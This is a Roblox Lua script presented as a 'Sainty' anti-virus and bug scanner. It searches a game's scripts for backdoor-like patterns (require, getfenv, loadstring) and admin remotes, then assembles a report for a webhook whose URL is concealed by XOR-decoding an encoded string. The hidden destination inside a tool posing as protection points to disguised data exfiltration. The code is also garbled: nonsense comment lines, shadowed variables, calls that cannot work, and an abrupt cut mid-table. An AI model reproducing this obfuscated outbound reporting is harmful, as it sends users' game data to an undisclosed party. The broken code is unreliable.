-- Sainty [BETA] -- // Encrypted User & Protects users from viruses & bugses ⚠️

-- // HTTP SERVICE WITH DECRYPTED FINDER [PATCH&^3232]
-- \\ [*{PATCH43141}]
-- || [(PATCH)4SAINTY]
-- (1)2(3)4(5)6(7)8)9(10)(11)(12)13(14)(15)(16)(17)(18)(19)(20)(21)(22)(23)(24)(25))
-- )2()(()((6()((6)(((3(()()(53(()()3(())(4()()(5))()()(())2()))3)))4))))4))(4)()()5())(6)()()(
-- ()4()()5())6())(4))()())()()(3)(()()()(5)()()()43()()()()3()(()()()4))(5)()()(6)()()()3()()(
Wait(100) -- // DELAYED WITH OTHER CHECKING PATCHED SCRIPTS // -- [SAINTY]
local H = game:GetService("HttpService")
local P = game:GetService("Players") -- [BETA]

local function DecryptWebhook()
    local encrypted = "eJxdjsFqAzEMhu8oxpYpAW6Gk9f2JCTTtr63CzHynWUB8jcptVZ7JHF0U+0EISznS0v2TpT0pa9Bz43GqlcZXar7XyUOGWoR2eokgIqOjDC1DpYXqDBONh8PE5tIimkmGssNq6zFV4mJfFw=="
    local decrypted = "" -- [BETA]
    for i = 1, #encrypted do -- [BETA]
        local byte = string.byte(encrypted, i) -- // [BETA]
        decrypted = decrypted .. string.char(byte ~ 0x1F) -- // [BETA]
    end
    return decrypted
end -- [BETA]

local webhookUrl = DecryptWebhook() -- [BETA]

local R = { -- // [BETA]
    b = {}, -- // [BETA]
    h = {}, -- [BETA]
    l = {}, -- [BETA]
    p = {}, -- [BETA]
    e = 0, -- [BETA]
    r = {}, -- [BETA]
    u = {}, -- [BETA]
    w = {}, -- [BETA]
    bE = {}, -- THREAD 4.()()()(()()())
    iM = {}, -- THREAD .7))()(()()())
    sM = {}, -- THREAD .9()(()()()())
    dM = {}, -- THREAD.10 )()()()()
    lS = {}, -- THREAD 15  )()()()
    uP = {} --  THREAD 15. ))()()()
}

local function C()
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("Script") or s:IsA("LocalScript") then
            local src = s.Source
            if src:find("require%(") or src:find("getfenv%(") then
                table.insert(R.b, s:GetFullName())
            end
        end
    end
end

local function D()
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("Script") or s:IsA("LocalScript") then
            local src = s.Source
            if src:find("HttpService") and not src:find("Https://") then
                table.insert(R.h, s:GetFullName())
            end
        end
    end
end

local function E()
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("Script") or s:IsA("LocalScript") then
            local src = s.Source
            if src:find("loadstring%(") then
                table.insert(R.l, s:GetFullName())
            end
        end
    end
end

local function F()
    local limit = 5000
    for _, p in ipairs(game:GetDescendants()) do
        if p:IsA("MeshPart") or p:IsA("UnionOperation") then
            local m = p:GetMeshId()
            if m and m.VertexCount and m.VertexCount > limit then
                table.insert(R.p, p:GetFullName() .. " with vertex count: " .. m.VertexCount)
            end
        end
    end
end

local function G()
    local count = 0
    local limit = 1000
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("Script") or s:IsA("LocalScript") then
            count = count + 1
        end
    end
    if count > limit then
        R.e = count
    end
end

local function H()
    for _, r in ipairs(game:GetDescendants()) do
        if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
            if r.Name:find("Admin") or r.Name:find("Mod") then
                table.insert(R.r, r:GetFullName())
            end
        end
    end
end

local function I()
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("LocalScript") then
            local src = s.Source
            if src:find("UserInputService") and not src:find("UserInputService.InputBegan") then
                table.insert(R.u, s:GetFullName())
            end
        end
    end
end

local function J()
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("Script") or s:IsA("LocalScript") then
            local src = s.Source
            local wCount = select(2, src:gsub("wait%(", ""))
            if wCount > 10 then
                table.insert(R.w, s:GetFullName() .. " with " .. wCount .. " wait() calls")
            end
        end
    end
end

local function K()
    for _, b in ipairs(game:GetDescendants()) do
        if b:IsA("BindableEvent") or b:IsA("BindableFunction") then
            if b.Name:find("Admin") or b.Name:find("Mod") then
                table.insert(R.bE, b:GetFullName())
            end
        end
    end
end

local function L()
    for _, i in ipairs(game:GetDescendants()) do
        if i:IsA("Script") or i:IsA("LocalScript") then
            local src = i.Source
            if src:find("Instance.new%(") or src:find("Instance:Destroy%(") then
                table.insert(R.iM, i:GetFullName())
            end
        end
    end
end

local function M()
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("Script") or s:IsA("LocalScript") then
            local src = s.Source
            if src:find("game.Players%.[a-zA-Z0-9_]+%.[a-zA-Z0-9_]+") then
                table.insert(R.sM, s:GetFullName())
            end
        end
    end
end

local function N()
    local deprecated = {"Workspace:FindFirstChildWhichIsA", "Instance:FindFirstChildWhichIsA"}
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("Script") or s:IsA("LocalScript") then
            local src = s.Source
            for _, d in ipairs(deprecated) do
                if src:find(d) then
                    table.insert(R.dM, s:GetFullName() .. " using deprecated method: " .. d)
                end
            end
        end
    end
end

local function O()
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("LocalScript") then
            local src = s.Source
            if src:find("game.Players.LocalPlayer") and not src:find("PlayerScripts") then
                table.insert(R.lS, s:GetFullName())
            end
        end
    end
end

local function P()
    for _, s in ipairs(game:GetDescendants()) do
        if s:IsA("Script") or s:IsA("LocalScript") then
            local src = s.Source
            if src:find("Players:FindFirstChild") and not src:find("PlayerScripts") then
                table.insert(R.uP, s:GetFullName())
            end
        end
    end
end

local function Q()
    local embed = {
        title = "Comprehensive Bug and Vulnerability Report",
        description = "Here are the results of the recent checks:",
        fields = {
            { name = "Potential Backdoors", value = #R.b > 0 and table.concat(R.b, "\n") or "None", inline = false },
            { name = "Non-HTTPS HTTP Requests", value = #R.h > 0 and table.concat(R.h, "\n") or "None", inline = false },
            { name = "Unsafe loadstring Usage", value = #R.l > 0 and table.concat(R.l, "\n") or "None", inline = false },
            { name = "High-Poly Parts", value = #R.p > 0 and table.concat(R.p, "\n") or "None", inline = false },
            { name = "Excessive Scripts", value = R.e > 0 and tostring(R.e) or "None", inline = false },
            { name = "Unsafe RemoteEvents and RemoteFunctions", value = #R.r > 0 and table.concat(R.r, "\n") or "None", inline = false },
            { name = "Unsafe UserInputService Usage", value = #R.u > 0 and table.concat(R.u, "\n") or "None", inline = false },
            { name = "Excessive wait() Calls", value = #R.w > 0 and table.concat(R.w, "\n") or "None", inline = false },
            { name = "Unsafe BindableEvents", value = #R.bE > 0 and table.concat(R.bE, "\n") or "None", inline = false },
            { name = "Unsafe Instance Methods", value = #R.iM > 0 and table.concat(R.iM, "\n") or "None", inline = false },
            { name = "Suspicious Game Modifications", value = #R.sM > 0 and table.concat(R.sM, "\n") or "None", inline = false },
            { name = "Deprecated Methods", value = #R.dM > 0 and table.concat(R.dM, "\n") or "None", inline = false },
            { name = "LocalScript Issues", value = #R.lS > 0 and table.concat(R.lS, "\n") or "None", inline = false },
           
-- // Print Out the functions to allow for http service and allow bounding connections ✅

-- [S]    print("Version v.1.0.4")